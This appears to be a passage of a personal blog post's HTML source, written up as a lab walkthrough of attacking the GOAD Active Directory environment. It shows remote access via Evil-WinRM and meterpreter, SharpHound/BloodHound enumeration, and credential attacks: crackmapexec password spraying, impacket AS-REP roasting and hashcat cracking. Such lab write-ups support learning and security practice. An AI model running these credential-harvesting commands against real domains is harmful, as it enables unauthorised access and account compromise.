+	srcset="/p/active-directory-part-2-exploring-goad-environment/image6_hu10856134132132352402.png 480w, /p/active-directory-part-2-exploring-goad-environment/image6_hu15234053413621800816.png 1024w"
+	loading="lazy"
+	
+		alt="using evil-winrm to remote access the machine"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="505"
+		data-flex-basis="1212px"
+	
+></p>
+<p>Evil-winrm is good in the same way that meterpreter is helpful as it allows you to easily upload and download files. This can be useful when trying to get domain information using SharpHound to exfiltrate the zip that is generated.</p>
+<p>I was having trouble doing this through Evil-WinRM, so we&rsquo;ll move over to meterpreter with the nt authority privileges and attempt to run SharpHound that way.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image7.png"
+	width="1543"
+	height="510"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image7_hu14070463673214676447.png 480w, /p/active-directory-part-2-exploring-goad-environment/image7_hu17346771357068749891.png 1024w"
+	loading="lazy"
+	
+		alt="using SharpHound to enumerate the domain"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="726px"
+	
+></p>
+<p>And from here you can use meterpreter to download the zip file.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image8.png"
+	width="1235"
+	height="126"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image8_hu2914436305173271639.png 480w, /p/active-directory-part-2-exploring-goad-environment/image8_hu3239327131353080161.png 1024w"
+	loading="lazy"
+	
+		alt="using meterpreter to download sharphound zip file"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="980"
+		data-flex-basis="2352px"
+	
+></p>
+<h3 id="bloodhound">BloodHound
+</h3><p>One great thing I like using BloodHound for is getting the users in the domain. You can also see what groups they&rsquo;re a part of and ways you may be able to exploit their privileges.</p>
+<p>The author of GOAD has a good tutorial on gathering users other ways, but those did not work for me, so going this route was much easier for me, especially with the Castelblack box being so vulnerable. You can view his walkthrough <a class="link" href="https://mayfly277.github.io/posts/GOADv2-pwning-part2/"  target="_blank" rel="noopener"
+    >here</a>.</p>
+<p>For me, I did the following query in BloodHound to view all the users.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">MATCH (u:User) RETURN u
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And this was the result.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image9.png"
+	width="1906"
+	height="875"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image9_hu2143932145989030627.png 480w, /p/active-directory-part-2-exploring-goad-environment/image9_hu1719818039209523258.png 1024w"
+	loading="lazy"
+	
+		alt="users being displayed in bloodhound"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="522px"
+	
+></p>
+<p>From here, you can make a list of users. These we will use to test for credentials. In the GOAD guide, his methods of collecting user credentials were very useful.</p>
+<h3 id="credential-gathering">Credential Gathering
+</h3><p>First, I made a list containing all the users we&rsquo;ve captured.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image10.png"
+	width="264"
+	height="365"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image10_hu894458065874602397.png 480w, /p/active-directory-part-2-exploring-goad-environment/image10_hu17707513776483341517.png 1024w"
+	loading="lazy"
+	
+		alt="image of user.txt file"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="72"
+		data-flex-basis="173px"
+	
+></p>
+<p>You can also click through all the users in BloodHound and look at their privileges. Particularly, sometimes users will leave credentials in their descriptions. We find this with the samwell.tarly user.</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image11.png"
+	width="462"
+	height="448"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image11_hu18075759676135983452.png 480w, /p/active-directory-part-2-exploring-goad-environment/image11_hu4214800668469146469.png 1024w"
+	loading="lazy"
+	
+		alt="user samwell.tarly having password in description"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="103"
+		data-flex-basis="247px"
+	
+></p>
+<p>We can also check usernames as passwords.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">crackmapexec smb 192.168.74.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/active-directory-part-2-exploring-goad-environment/image12.png"
+	width="1498"
+	height="325"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image12_hu3563041467773216095.png 480w, /p/active-directory-part-2-exploring-goad-environment/image12_hu12695700638234472659.png 1024w"
+	loading="lazy"
+	
+		alt="checking for users using their username as thier password"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="460"
+		data-flex-basis="1106px"
+	
+></p>
+<p>Another way to get credentials that was suggested in the guide was to use GetNPUsers.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile aspreroastables.txt -dc-ip 192.168.74.11 &#39;north.sevenkingdoms.local/&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/active-directory-part-2-exploring-goad-environment/image13.png"
+	width="1898"
+	height="408"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image13_hu17524711549465745187.png 480w, /p/active-directory-part-2-exploring-goad-environment/image13_hu2749505488518197694.png 1024w"
+	loading="lazy"
+	
+		alt="using getnpusers to dump kerberos hashes"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="465"
+		data-flex-basis="1116px"
+	
+></p>
+<p>This command generates a .txt file called &lsquo;aspreroastables.txt&rsquo; which you can run through hashcat to try and crack.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">hashcat -m 18200 aspreroastables.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/active-directory-part-2-exploring-goad-environment/image14.png"
+	width="1285"
+	height="792"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image14_hu1265579132568998943.png 480w, /p/active-directory-part-2-exploring-goad-environment/image14_hu9313923710402397754.png 1024w"
+	loading="lazy"
+	
+		alt="using hashcat to crack hash dumped"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="389px"
+	
+></p>
+<p>We now should have four credentials:</p>
+<p><img src="/p/active-directory-part-2-exploring-goad-environment/image15.png"
+	width="180"
+	height="163"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image15_hu7438753817952733884.png 480w, /p/active-directory-part-2-exploring-goad-environment/image15_hu9809159397793653376.png 1024w"
+	loading="lazy"
+	
+		alt="image of all the passwords collected so far"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="265px"
+	
+></p>
+<p>You can also perform a password spray with the users and passwords you&rsquo;ve collected, but it looks like the passwords only match up with the people we found them for.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">crackmapexec smb 192.168.74.11 -u users.txt -p passwords.txt --continue-on-success
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/active-directory-part-2-exploring-goad-environment/image16.png"
+	width="1210"
+	height="791"
+	srcset="/p/active-directory-part-2-exploring-goad-environment/image16_hu1193053282102765574.png 480w, /p/active-directory-part-2-exploring-goad-environment/image16_hu11490271401530542278.png 1024w"
+	loading="lazy"
+	
+		alt="image using crackmap to perform password spray"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="367px"
+	
+></p>
+<h3 id="sources">Sources
+</h3><ul>
+<li><a class="link" href="https://blog.compass-security.com/2020/07/make-the-most-out-of-bloodhound/"  target="_blank" rel="noopener"
+    >https://blog.compass-security.com/2020/07/make-the-most-out-of-bloodhound/</a></li>
+<li><a class="link" href="https://mayfly277.github.io/posts/GOADv2-pwning-part2/"  target="_blank" rel="noopener"
+    >https://mayfly277.github.io/posts/GOADv2-pwning-part2/</a></li>
+<li><a class="link" href="https://github.com/itm4n/PrintSpoofer"  target="_blank" rel="noopener"
+    >https://github.com/itm4n/PrintSpoofer</a></li>
+</ul>
+<h2 id="conclusion">Conclusion
+</h2><p>This was just the first part of my exploration through Active Directory utilizing GOAD. In the coming writeups, I will be exploring getting into the other machines and moving around in the environment further.</p>
+<p>Please leave a comment if you have any recommendations on things I could improve, or any thoughts on the process. Thank you for reading!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/post/">Post</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/attacking-active-directory-with-responder-and-ntlmrelayx/">
+        
+        
+            <div class="article-image">
+                <img src="/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1.421982643a6ccebca12eb9f74586153a_hu5579727104158283614.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Attacking Active Directory With Responder and NTLMrelayX"
+                        
+                        data-hash="md5-QhmCZDpszryhLrn3RYYVOg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Attacking Active Directory With Responder and NTLMrelayX</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/forensics-using-volatility/">
+        
+        
+            <div class="article-image">
+                <img src="/p/forensics-using-volatility/shellbags-output.6e3c44ae9c4bed6f4236fd78f6d0153e_hu6728456964635033659.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Forensics Using Volatility"
+                        
+                        data-hash="md5-bjxErpxL7W9CNv149tAVPg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Forensics Using Volatility</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/secure-file-storage/">
+        
+        
+            <div class="article-image">
+                <img src="/p/secure-file-storage/Untitled-1.f5228d55f03014c2570aed6f78901635_hu11265372550408182528.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Secure File Storage"
+                        
+                        data-hash="md5-9SKNVfAwFMJXCu1veJAWNQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Secure File Storage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/crosslock/">
+        
+        
+            <div class="article-image">
+                <img src="/p/crosslock/decompiler.4615533bc2c12007d7e3fa1be7bb481e_hu1303265344836878652.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Crosslock"
+                        
+                        data-hash="md5-RhVTO8LBIAfX4/ob57tIHg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Crosslock</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kd0ve" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Kat
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.adb703823fd81ee5268cfced2d62986494c70e86f61648fd7e631d6c99bcc1eb.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
